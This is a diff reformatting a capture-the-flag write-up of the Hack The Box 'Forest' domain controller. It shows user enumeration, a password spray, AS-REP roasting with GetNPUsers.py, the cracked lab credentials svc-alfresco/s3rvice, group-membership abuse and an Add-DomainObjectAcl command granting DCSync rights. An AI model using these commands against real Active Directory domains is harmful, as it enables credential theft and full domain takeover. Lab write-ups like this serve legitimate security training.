@@ -76,12 +76,12 @@ Host script results:
 ### Domain Controller Detected
 
 We find a collection of ports that give us a high probability that this is windows machine and a domain controller:
-- DNS on port 53
-- Kerberos on port 88
-- SMB on port 445
-- LDAP on port 636
-- Global Catalog on port 3268
-- WinRM on port 5985
+- **DNS** on port 53
+- **Kerberos** on port 88
+- **SMB** on port 445
+- **LDAP** on port 636
+- **Global** Catalog on port 3268
+- **WinRM** on port 5985
 
 From the nmap script `smb-os-discovery`, the domain name should be `htb.local`
 
@@ -89,7 +89,10 @@ From the nmap script `smb-os-discovery`, the domain name should be `htb.local`
 
 We want to start enumerating users. So we use an impacket tool called `GetADUsers.py`.
 
-The command is: `GetADUsers.py -dc-ip 10.10.10.161 "htb.local/" -all`
+The command is:
+```bash
+GetADUsers.py -dc-ip 10.10.10.161 "htb.local/" -all
+```
 
 ```
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
@@ -154,7 +157,7 @@ Also, the year this machine has been launched is 2019. So we will use that year 
 
 I write a quick `PowerShell` script for this:
 
-```
+```powershell
 $CompanyName = "Forest"
 $Seasons = 'Summer', 'Winter', 'Spring', 'Fall'
 $Years = 2017..2021
@@ -204,7 +207,9 @@ I then use `crackmapexec` to obtain the password policy. We don't want to lock e
 We see that `Account Lockout Threshold: None` and `Domain Password Lockout Admins: 0`. This is amazing! we can definitely bruteforce without any problems :D
 
 We start the spray using:
-`crackmapexec smb 10.10.10.161 -u users.txt -p passwords.txt --continue-on-success`
+```bash
+crackmapexec smb 10.10.10.161 -u users.txt -p passwords.txt --continue-on-success
+```
 
 But we get no luck with that :/
 
@@ -214,7 +219,9 @@ But we get no luck with that :/
 
 we run this attack using impacket's `GetNPUsers.py` script:
 
-`GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile asrep-hashes.txt`
+```bash
+GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile asrep-hashes.txt
+```
 
 This is after we set `10.10.10.161` as our name server in `/etc/resolv.conf`. We do this because impacket does DNS lookups in the background.
 
@@ -233,8 +240,8 @@ we use `john` to crack the hash and the password for `svc-alfresco` turns out to
 *in case you were wondering,* the wordlist I used `gegalist.txt` is just one big list of all the passwords on `Seclists` (https://github.com/danielmiessler/SecLists/tree/master/Passwords) concatenated and cleaned up. I use it for all hash cracking. It's only 21,377,691 passwords. Just kidding, it's a pretty fat list XD
 
 Alright, here is our first set of creds:
-- Username: htb.local\svc-alfresco
-- Password: s3rvice
+- **Username:** htb.local\svc-alfresco
+- **Password:** s3rvice
 
 ### Remote Code Execution
 
@@ -302,7 +309,10 @@ It looks horrible at first. *But, after taking a closer look,* we notice that ou
 
 ![abuse-write-dacl](/assets/Forest/abuse-write-dacl.jpg)
 
-we add our user to that group using a powershell command: `Add-ADGroupMember 'Exchange Windows Permissions' -members 'svc-alfresco'`
+we add our user to that group using a powershell command:
+```powershell
+Add-ADGroupMember 'Exchange Windows Permissions' -members 'svc-alfresco'
+```
 
 ![adding-to-group](/assets/Forest/adding-to-group.jpg)
 
@@ -316,7 +326,7 @@ we view the help page and usage examples of the abuse command `Add-DomainObjectA
 
 we notice that we need to create a Powershell `Credential Object` and run the command to give our user `svc-alfresco` `DCSync` rights over `htb.local`. It should be as below:
 
-```
+```powershell
 $SecPassword = ConvertTo-SecureString 's3rvice'-AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('HTB.local\svc-alfresco', $SecPassword)
 Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.local\svc-alfresco' -Rights DCSync -Credential $Cred -Verbose
